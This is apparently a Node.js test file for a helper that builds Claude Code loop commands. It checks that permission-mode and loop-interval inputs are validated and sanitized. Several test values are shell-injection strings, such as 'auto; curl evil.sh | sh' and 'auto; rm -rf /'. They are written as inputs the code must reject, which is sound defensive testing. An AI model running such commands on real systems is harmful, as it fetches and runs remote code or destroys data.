'use strict';
// buildLoopCommand slices the ## Automation section out of LOOP.md and requires a fenced block
// THERE (not the first fence in the file — LOOP.md has several earlier fences).
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const {
  buildLoopCommand, buildClaudeBase,
  PERMISSION_MODES, isValidPermissionMode, sanitizePermissionMode,
  isValidLoopInterval, sanitizeLoopInterval,
} = require('../out-test/loop.js');
const { parseTodo } = require('../out-test/parser.js');
const { serializeTodo } = require('../out-test/writer.js');

function readMedia(name) {
  return fs.readFileSync(path.join(process.cwd(), 'media', name), 'utf8');
}

test('buildLoopCommand: bootstrap prompt names model + interval, points at .loopboard/LOOP.md', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'sonnet', '5m');
  assert.ok(cmd, 'a loop command was built from the shipped LOOP.md template');
  assert.match(cmd, /^\/loop 5m /, 'interval honored');
  assert.ok(cmd.includes('running as model sonnet'), 'model injected');
  assert.ok(cmd.includes('.loopboard/LOOP.md'), 'points at LOOP.md');
  assert.ok(cmd.includes('Automation section'), 'directs the worker to the Automation section');
  assert.ok(!cmd.includes("'"), 'no apostrophes (short-argv escaping constraint)');
  assert.ok(!cmd.includes('\n'), 'single line for the TUI paste');
  assert.ok(cmd.length < 300, 'bootstrap prompt stays tiny');
});

test('buildClaudeBase single-quotes the --model so glob metachars (haiku[1m]) do not expand', () => {
  assert.equal(
    buildClaudeBase('auto', 'haiku[1m]'),
    "claude --permission-mode auto --model 'haiku[1m]'"
  );
  // A plain id is quoted too — harmless, and keeps one code path.
  assert.equal(buildClaudeBase('acceptEdits', 'opus'), "claude --permission-mode acceptEdits --model 'opus'");
});

test('isValidPermissionMode: accepts every package.json enum value, rejects anything else', () => {
  for (const m of PERMISSION_MODES) assert.ok(isValidPermissionMode(m), `${m} is valid`);
  assert.ok(!isValidPermissionMode('auto; curl evil.sh | sh'), 'shell injection rejected');
  assert.ok(!isValidPermissionMode(''), 'empty rejected');
  assert.ok(!isValidPermissionMode('AUTO'), 'case-sensitive');
});

test('sanitizePermissionMode: passes valid through, falls back to auto otherwise', () => {
  assert.equal(sanitizePermissionMode('bypassPermissions'), 'bypassPermissions');
  assert.equal(sanitizePermissionMode('auto; rm -rf /'), 'auto');
  assert.equal(sanitizePermissionMode(''), 'auto');
});

test('buildClaudeBase sanitizes an injected permissionMode so the shell line stays safe', () => {
  const line = buildClaudeBase('auto; curl evil.sh | sh', 'opus');
  assert.equal(line, "claude --permission-mode auto --model 'opus'");
  assert.ok(!line.includes('curl'), 'the injected payload never reaches the shell line');
});

test('isValidLoopInterval: accepts <digits><s|m|h|d>, rejects garbage/injection', () => {
  for (const ok of ['1m', '5m', '30s', '2h', '7d', '10m']) assert.ok(isValidLoopInterval(ok), `${ok} valid`);
  for (const bad of ['', '1', 'm', '1x', '1m; ls', '-1m', '1 m', '1M']) assert.ok(!isValidLoopInterval(bad), `${bad} invalid`);
});

test('sanitizeLoopInterval falls back to 1m for invalid values', () => {
  assert.equal(sanitizeLoopInterval('5m'), '5m');
  assert.equal(sanitizeLoopInterval('1m; rm -rf /'), '1m');
  assert.equal(sanitizeLoopInterval('nonsense'), '1m');
});

test('buildLoopCommand sanitizes the interval before splicing it into the prompt', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '5m; echo pwned');
  assert.ok(cmd, 'a command was built');
  assert.match(cmd, /^\/loop 1m /, 'invalid interval falls back to 1m');
  assert.ok(!cmd.includes('pwned'), 'the injected payload never reaches the prompt');
});

test('buildLoopCommand: undefined when there is no ## Automation section', () => {
  assert.equal(buildLoopCommand('# LOOP\n\n## Rules\n\n```\nsome fence\n```\n', 'opus', '1m'), undefined);
});

test('buildLoopCommand: undefined when Automation has no fenced block', () => {
  assert.equal(buildLoopCommand('# LOOP\n\n## Automation\n\nNo code block here.\n', 'opus', '1m'), undefined);
});

test('buildLoopCommand: an earlier fence (before ## Automation) is NOT picked', () => {
  // The Storage/Workflow fences come first; Automation itself has no fence -> undefined.
  const text = [
    '# LOOP', '', '## Storage', '', '```', 'layout', '```', '',
    '## Automation', '', 'Prose only, no fenced block.', '',
  ].join('\n');
  assert.equal(buildLoopCommand(text, 'opus', '1m'), undefined);
});

test('template-todo.md scaffold parses to zero entries and is a fixpoint', () => {
  const src = readMedia('template-todo.md');
  const doc = parseTodo(src);
  assert.equal(doc.entries.length, 0, 'scaffold starts with no tasks');
  const once = serializeTodo(doc);
  const twice = serializeTodo(parseTodo(once));
  assert.equal(twice, once, 'fixpoint');
});
